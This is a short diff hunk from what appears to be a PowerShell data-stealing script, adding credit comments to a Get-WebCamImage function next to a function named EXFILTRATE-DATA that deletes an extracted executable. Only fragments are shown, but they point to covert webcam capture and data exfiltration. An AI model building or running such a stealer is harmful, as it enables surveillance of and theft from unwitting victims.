@@ -465,7 +465,10 @@ function EXFILTRATE-DATA {
     Remove-Item "$extracted\main.exe"
 }
 
-function Get-WebCamImage { 
+function Get-WebCamImage {
+    # made by https://github.com/stefanstranger/PowerShell/blob/master/Get-WebCamp.ps1
+    # he did 99% of the work
+    # other 1% modified by KDot227
     $source=@" 
     using System; 
     using System.Collections.Generic; 
